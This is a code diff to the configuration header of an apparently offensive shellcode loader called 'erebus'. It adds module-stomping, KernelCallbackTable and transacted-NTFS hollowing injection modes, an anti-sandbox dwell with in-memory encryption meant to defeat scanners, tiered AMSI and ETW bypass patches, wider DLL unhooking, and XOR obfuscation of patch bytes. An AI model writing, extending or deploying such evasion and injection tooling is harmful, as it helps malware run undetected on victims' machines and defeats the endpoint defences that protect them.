@@ -72,6 +72,9 @@
 // 3 = EarlyCascade        - Early Bird APC injection via NtQueueApcThread (Remote)
 // 4 = PoolParty           - Worker Factory thread pool injection (Remote)
 // 5 = NtQueueApcThread    - Vanilla NtQueueApcThread Early Bird with jittered post-APC delay (Remote)
+// 6 = ModuleStomp          - Map legitimate DLL, overwrite .text; VAD shows file-backed (Self)
+// 7 = KernelCallbackTable  - Overwrite PEB KCT entry, trigger via SendMessage (Self)
+// 8 = TxfHollow            - Transacted NTFS ghost section; VAD shows phantom file path (Remote)
 #ifndef CONFIG_INJECTION_TYPE
 #define CONFIG_INJECTION_TYPE 4
 #endif
@@ -83,6 +86,15 @@
 #define CONFIG_INJECTION_MODE 1  // Remote injection (Create Suspended)
 #elif CONFIG_INJECTION_TYPE == 2
 #define CONFIG_INJECTION_MODE 2  // Self injection
+#elif CONFIG_INJECTION_TYPE == 6
+#define CONFIG_INJECTION_MODE 2  // Self injection
+#elif CONFIG_INJECTION_TYPE == 7
+#define CONFIG_INJECTION_MODE 2  // Self injection
+#elif CONFIG_INJECTION_TYPE == 8
+#ifndef CONFIG_TARGET_PROCESS
+#define CONFIG_TARGET_PROCESS L"C:\\Windows\\System32\\calc.exe"
+#endif
+#define CONFIG_INJECTION_MODE 1  // Remote injection (Create Suspended)
 #elif CONFIG_INJECTION_TYPE == 4
 #ifndef CONFIG_TARGET_PROCESS
 #define CONFIG_TARGET_PROCESS \
@@ -117,6 +129,12 @@
 #define ExecuteShellcode erebus::InjectionPoolParty
 #elif CONFIG_INJECTION_TYPE == 5
 #define ExecuteShellcode erebus::InjectionNtQueueApcThread
+#elif CONFIG_INJECTION_TYPE == 6
+#define ExecuteShellcode erebus::InjectionModuleStomp
+#elif CONFIG_INJECTION_TYPE == 7
+#define ExecuteShellcode erebus::InjectionKernelCallback
+#elif CONFIG_INJECTION_TYPE == 8
+#define ExecuteShellcode erebus::InjectionTxfHollow
 #endif
 
 // ============================================
@@ -174,7 +192,7 @@
 // ============================================
 
 // 0 = disabled
-// 1 = enabled — InitCallstackSpoof() runs in RunEvasionPatches(), locating
+// 1 = enabled - InitCallstackSpoof() runs in RunEvasionPatches(), locating
 //     `add rsp, 0x68; ret` inside the module list below. Use GetSpoofGadget()
 //     to fill SpoofContext::Gadget, then call SpoofCall() at injection sites.
 #ifndef CONFIG_CALLSTACK_SPOOF_ENABLED
@@ -194,6 +212,90 @@
             erebus::HashStringFowlerNollVoVariant1a("kernel32.dll"), \
             erebus::HashStringFowlerNollVoVariant1a("kernelbase.dll")
 #endif
+
+// ============================================
+// SLEEP OBFUSCATION CONFIGURATION
+// ============================================
+
+// Pre-injection dwell mode:
+// 0 = None       - no dwell (default; loader executes immediately)
+// 1 = Timer      - WaitableTimer jittered dwell (anti-sandbox timing bypass)
+// 2 = Ekko-lite  - Timer + XOR non-.text PE sections during wait
+//                  (hides shellcode/config from memory scanners during sleep)
+//
+// Mode 1 and 2 are effective against sandboxes that accelerate Sleep() /
+// NtDelayExecution() - WaitableTimer fires at real wall-clock time.
+// Mode 2 additionally encrypts .rdata (where the shellcode blob lives)
+// during the wait window, defeating signature-based memory scanners.
+#ifndef CONFIG_SLEEP_OBFUSCATION_TYPE
+#define CONFIG_SLEEP_OBFUSCATION_TYPE 0
+#endif
+
+// Base dwell in milliseconds before injection begins.
+// Actual dwell = CONFIG_SLEEP_OBFUSCATION_BASE_MS
+//              + random(0, CONFIG_SLEEP_OBFUSCATION_JITTER_MS)
+#ifndef CONFIG_SLEEP_OBFUSCATION_BASE_MS
+#define CONFIG_SLEEP_OBFUSCATION_BASE_MS 5000
+#endif
+
+// Maximum random milliseconds added to the base dwell for jitter.
+// Set to 0 to disable jitter (fixed dwell = base_ms only).
+#ifndef CONFIG_SLEEP_OBFUSCATION_JITTER_MS
+#define CONFIG_SLEEP_OBFUSCATION_JITTER_MS 3000
+#endif
+
+// ============================================
+// AMSI BYPASS CONFIGURATION
+// ============================================
+
+// AMSI bypass type:
+// 0 = None
+// 1 = PatchAmsiScanBuffer (existing PatchAmsi())
+// 2 = PatchAmsiScanBuffer + PatchAmsiOpenSession
+// 3 = All + InvalidateAmsiContext
+#ifndef CONFIG_AMSI_BYPASS_TYPE
+#define CONFIG_AMSI_BYPASS_TYPE 1
+#endif
+
+// ============================================
+// ETW BYPASS CONFIGURATION
+// ============================================
+
+// ETW bypass type:
+// 0 = None
+// 1 = PatchEtwEventWrite (existing PatchEtw())
+// 2 = PatchEtwEventWrite + PatchEtwEventWriteFull
+// 3 = All + UnregisterEtwProviders
+#ifndef CONFIG_ETW_BYPASS_TYPE
+#define CONFIG_ETW_BYPASS_TYPE 1
+#endif
+
+// ============================================
+// UNHOOK SCOPE CONFIGURATION
+// ============================================
+
+// Unhook scope:
+// 0 = ntdll only (existing UnhookNtdll())
+// 1 = ntdll + kernel32 + kernelbase
+// 2 = selective (list of hashed function names)
+#ifndef CONFIG_UNHOOK_SCOPE
+#define CONFIG_UNHOOK_SCOPE 0
+#endif
+
+// ============================================
+// PATCH XOR KEY CONFIGURATION
+// ============================================
+
+// XOR key for obfuscating patch byte arrays (single byte).
+// Applied at compile time when encoding the static kEncoded[] arrays;
+// decoded inline at runtime before the bytes are written to memory.
+#ifndef CONFIG_PATCH_XOR_KEY
+#define CONFIG_PATCH_XOR_KEY 0xAB
+#endif
+
+// ============================================
+// GUARDRAILS HELPER
+// ============================================
 
 // Helper function to get configured guardrails
 inline erebus::guardrails::GuardrailConfig GetGuardrailConfig() {
